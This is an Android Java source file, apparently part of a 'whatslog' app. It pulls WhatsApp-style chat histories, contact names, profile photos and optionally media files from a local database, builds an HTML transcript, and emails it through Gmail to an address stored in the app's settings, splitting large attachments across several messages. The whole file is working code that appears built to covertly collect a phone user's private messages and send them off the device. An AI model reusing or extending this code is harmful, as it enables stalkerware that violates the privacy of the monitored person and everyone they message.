package com.whatslog;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collection;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import android.content.Context;

import com.gmailsender.GMailSender;
import com.j256.ormlite.dao.Dao;
import com.whatslog.dao.DatabaseHelperConfiguracao;
import com.whatslog.dao.DatabaseHelperInternal;
import com.whatslog.model.ChatList;
import com.whatslog.model.Configuracao;
import com.whatslog.model.Messages;

public class HtmlHelper {

	private Context context;
	private GMailSender gmail;
	private Map<String, byte[]> anexos;
	private Configuracao configuracao;

	private Dao<ChatList, Integer> daoChat;
	private final long MAX_SIZE = 26214400;

	private Map<ChatList, Map<Date, List<Messages>>> chats;
	private Map<ChatList, List<Messages>> chatsMessages;
	private StringBuilder html;
	private final String MENSAGEM_MOLDE = "<div class=\"eventtype t%s\"><div class=\"contents\"><h3><a class=\"searchable\" href=\"#\" >%s</a><span class=\"device\">%s</span></h3><div class=\"econtent\"><span class=\"searchable\">%s</span></div><div class=\"einfo\">%s</div></div></div><div class=\"clear\"></div><div  class=\"arrow%s\"></div>";
	private final String HEADER_MOLDE = "<div class=\"eventtype t%s\"><div class=\"foto\"><img src=\"data:image/png;base64,%s\"/></div><div class=\"contents\"><h3><a class=\"searchable\" href=\"%s\" >%s</a><span class=\"device\">%s</span></h3><div class=\"econtent\"><span class=\"searchable\">%s</span></div><div class=\"einfo\">%s</div></div></div><div class=\"clear\"></div>";

	private final String DATA_MOLDE = "<div class=\"date-divider\"><a>%s</a></div>";
	private final String SEPARADOR_MOLDE = "<div class=\"contact-divider\" id=\"%s\"><div class=\"foto\"><img src=\"data:image/png;base64,%s\"/></div><span>&nbsp;</span><div>%s</div></div>";
	private long tamanhoAnexos = 0;

	public HtmlHelper(Context ctx) {
		this.context = ctx;
		gmail = new GMailSender(ctx);
		try {
			daoChat = (new DatabaseHelperInternal(context)).getChatDao();
			getChats();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}

	private Map<ChatList, Map<Date, List<Messages>>> getChats() {
		if (chats == null) {
			chats = new HashMap<ChatList, Map<Date, List<Messages>>>();
			chatsMessages=new HashMap<ChatList, List<Messages>>();
			try {
				List<ChatList> tmp = daoChat.queryForAll();

				for (ChatList chatList : tmp) {

					if (!chats.containsKey(chatList))
						chats.put(chatList, new HashMap<Date, List<Messages>>());


					List<Messages> mensagens = chatList.getMensagens();
					chatsMessages.put(chatList, mensagens);

					for (Messages mensagem : mensagens) {

						Calendar data = Calendar.getInstance();
						data.setTime(mensagem.getTimestamp());

						data.set(Calendar.HOUR_OF_DAY, 0);
						data.set(Calendar.MINUTE, 0);
						data.set(Calendar.SECOND, 0);
						data.set(Calendar.MILLISECOND, 0);

						List<Messages> dates = new ArrayList<Messages>();
						if (chats.get(chatList).containsKey(data.getTime()))
							dates = chats.get(chatList).get(data.getTime());
						else
							chats.get(chatList).put(data.getTime(), dates);

						dates.add(mensagem);

					}

				}

			} catch (SQLException e) {
			}

		}
		return chats;
	}

	public StringBuilder getHtml() {

		if (html == null) {
			html = new StringBuilder();

			Set<ChatList> ctmp=chats.keySet();

			for(ChatList chat: ctmp){
				Messages mensagem=chatsMessages.get(chat).get(0);

				html.append(String.format(HEADER_MOLDE, "4",chat.getPhoto(context.getContentResolver()),"#"+chat.getKey_remote_jid(),
						chat.getNome(context.getContentResolver()),
						"", getMensagem(mensagem),
						new SimpleDateFormat("dd/MM/yyyy hh:mm:ss")
								.format(mensagem.getTimestamp())));

			}



			for(ChatList chat: ctmp){

				html.append(String.format(SEPARADOR_MOLDE,chat.getKey_remote_jid(),chat.getPhoto(context.getContentResolver()),chat.getNome(context.getContentResolver()) ));


				Map<Date, List<Messages>> tmpLista = chats.get(chat);

				Set<Date> dates = tmpLista.keySet();

				for (Date data : dates) {

					List<Messages> mensagens = tmpLista.get(data);

					html.append(String.format(DATA_MOLDE, new SimpleDateFormat(
							"dd/MM/yyyy").format(data)));

					Collections.reverse(mensagens);

					for (Messages mensagem : mensagens) {

						String tipo = mensagem.getKey_from_me() == 1 ? "5"
								: "4";

						html.append(String.format(MENSAGEM_MOLDE, tipo,
								mensagem.getNome(context.getContentResolver()),
								"", getMensagem(mensagem),
								new SimpleDateFormat("dd/MM/yyyy hh:mm:ss")
										.format(mensagem.getTimestamp()), tipo));
					}
				}
				html.append("</div>");
			}
		}
		return html;
	}

	public Map<String, byte[]> getAnexos() {
		if (anexos == null) {
			anexos = new HashMap<String, byte[]>();
			File chatsFile = getHtmlFile();

			try {
				anexos.put(chatsFile.getName(),
						com.gmailsender.Utils.getBytes(chatsFile));
				tamanhoAnexos += chatsFile.length();
			} catch (IOException e) {
				e.printStackTrace();
			}

			if (getConfiguracao().isMedia()) {
				Collection<Map<Date, List<Messages>>> tmpLista = chats.values();

				for (Map<Date, List<Messages>> tmpDates : tmpLista) {

					Set<Date> dates = tmpDates.keySet();

					for (Date data : dates) {

						List<Messages> mensagens = tmpDates.get(data);

						for (Messages mensagem : mensagens) {
							if (mensagem.isMedia()) {

								String tipo = "";
								if (mensagem.isAudio())
									tipo = "Audio";
								else if (mensagem.isImagem())
									tipo = "Images";
								else if (mensagem.isVideo())
									tipo = "Images";

								long tamanho = Long.parseLong(mensagem
										.getMedia_size());
								anexos.put(
										getKey(mensagem),
										Utils.getMediaFile(
												tipo,
												tamanho,
												new SimpleDateFormat("yyyyMMdd").format(mensagem
														.getReceived_timestamp()), 2));
								tamanhoAnexos += tamanho;
							}
						}
					}
				}
			}
		}
		return anexos;
	}

	public List<MailMessage> getMails() {

		List<MailMessage> mails = new ArrayList<MailMessage>();

		Set<String> anexos = getAnexos().keySet();
		int qtd;
		if (tamanhoAnexos <= MAX_SIZE)
			qtd = 1;
		else {
			qtd = (int) (tamanhoAnexos / MAX_SIZE);
			qtd = tamanhoAnexos % MAX_SIZE > 0 ? qtd + 1 : qtd;
		}

		for (int i = 0; i < qtd; i++) {
			MailMessage t = new MailMessage();
			mails.add(t);
		}

		Set<String> keys = getAnexos().keySet();
		int count = 0;
		for (String key : keys) {

			byte[] anexo = getAnexos().get(key);
			MailMessage m = mails.get(count);

			if (m.getTamanho() + anexo.length <= MAX_SIZE)
				m.getAnexos().put(key, anexo);
			else {
				count++;
				MailMessage m2 = mails.get(count);
				m2.getAnexos().put(key, anexo);
			}
		}

		return mails;
	}

	private File getHtmlFile() {
		File outputDir = context.getCacheDir(); // context being

		File chatsFile = new File(outputDir, "logs_"
				+ (new SimpleDateFormat("dd_MM_yyyy").format(new Date()))
				+ ".html");
		try {
			OutputStream output = new FileOutputStream(chatsFile);

			output.write(wrapHtml(getHtml()).toString().getBytes());
			output.flush();
			output.close();
			return chatsFile;
		} catch (IOException e) {
			e.printStackTrace();
		}

		return null;

	}

	private Configuracao getConfiguracao() {
		if (configuracao == null) {
			DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
					context);
			List<Configuracao> confs;
			try {
				confs = database.getDao().queryForAll();
				Configuracao conf = null;

				if (confs.size() > 0) {
					conf = confs.get(0);
				}
				if (conf != null) {
					configuracao = conf;
				}
			} catch (Exception e) {
			}
		}
		return configuracao;
	}

	private String getMensagem(Messages mensagem) {

		if (getConfiguracao().isMiniatura() && !getConfiguracao().isMedia()) {
			if (mensagem.getRaw_data() != null)
				return "<img src=\"data:" + mensagem.getMedia_mime_type()
						+ ";base64,"
						+ Utils.encodeBase64(mensagem.getRaw_data()) + "\"/>";
		}
		if (getConfiguracao().isMedia()) {
			if (mensagem.isImagem())
				return "<img src=\"" + getKey(mensagem) + "\" />";
			else if (mensagem.isVideo()) {
				return "<video width=\"220\" height=\"140\" controls> <source src=\""
						+ getKey(mensagem)
						+ "\" type=\""
						+ mensagem.getMedia_mime_type()
						+ "\">Your browser does not support the video tag.</video>";
			} else if (mensagem.isAudio()) {
				return "<audio controls> <source src=\""
						+ getKey(mensagem)
						+ "\" type=\""
						+ mensagem.getMedia_mime_type()
						+ "\">Your browser does not support the audio tag.</audio>";
			}
		}
		return mensagem.getData();
	}

	private String getKey(Messages mensagem) {
		return mensagem.getMedia_url().split("/")[mensagem.getMedia_url()
				.split("/").length - 1];
	}

	private StringBuilder wrapHtml(StringBuilder html) {
		StringBuilder tmp = new StringBuilder();

		tmp.append(
				"<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta charset=\"utf-8\"><style>.clear{clear: both;}.device{font-weight: normal;font-style: italic;font-size:14px;text-align:right;}.date-divider{background: #fff;padding: 4px 7px;border: 1px solid #6ABA2F;margin: 15px 0 4px 0;}.date-divider a{text-decoration: none;}.eventtype{ margin-top: 6px; clear: both;}.contents{padding: 2px 8px 4px; margin: 0; float:right;}.contents h3{    margin:6px 0;       font-size:14px;}.contents p{    margin-top: 0;}.econtent{    margin-bottom:4px;}.econtent img{    vertical-align:middle;}.t2, .t5, .t15{    margin-left:20%;    background-color: #fff;    box-shadow: -2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;    float: right;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #309b19;    border-style: solid;    text-align: right;}.t1, .t3, .t4 {    margin-right: 20%;    background-color: #F5F5F5;    box-shadow: 2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;     float: left;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #9DA0A6;    border-style: solid;}.arrow2, .arrow5, .arrow15{    float: right;    width:23px;    height:10px;    margin-top:-1px;    margin-right:10px;   background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjhGMjZGMUREQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjhGMjZGMURFQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OEYyNkYxREJDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OEYyNkYxRENDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7tzfsZAAAAsUlEQVR42mI0mC35n4FGgEmRQ22lGJvkD1FWSaoa3KI8U5ER6HIQWxSIc6BYiApm5wLxFCYo5zUQ1wOxDBBnAfEdCgx+B8QLwMGCJvEdiKcDsSoQhwLxcTIMB+n/gs1wZLAGiK2geA2RBv8CBQc8QonQcBzqCw0gngX1HS4ACo4XpBgOAzeBOB2I5YG4CRq26GAiSlIkI0xxRf4mIL6GrJCFglQBi3wQDgHi++gKAAIMAK71JAwUWWlQAAAAAElFTkSuQmCC);}.arrow1, .arrow3, .arrow4{    width:23px;    height:10px;    margin-top:-1px;    margin-left:10px;    background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjJFQTAwOEEzQ0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjJFQTAwOEE0Q0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MkVBMDA4QTFDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkVBMDA4QTJDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6T0+uHAAAAWElEQVR42mKcMGHCfwYaASYWVuaptDD4P8P/f0x/fv/NoYXhjAyMzCw0MRcKWJAE/lPDQGTAQi1XYo1QYhViMZSgehZquhSfy/FpZiTVYEIuZ6Q02QAEGAC0LQraPP8eOQAAAABJRU5ErkJggg==);}.einfo{font-weight:bold;}.foto{float:left; padding: 2px 8px 4px; margin: 0;}.foto img{width:75px;}.contact-divider{ background: #fff;padding: 4px 7px;border: 1px solid #6ABA2F;margin: 15px 0 4px 0;height: 70px;}</style></head><body><div tabindex=\"0\" style=\"padding-top: 46px; min-height: 651px;\"><div>")
				.append(html).append("</div></body></html>");
		return tmp;
	}

	public void sendMails() {
		new SendEmailAsyncTask(gmail, getConfiguracao().getSubject(),
				getConfiguracao().getEmailTo()).execute(getMails());
	}
}
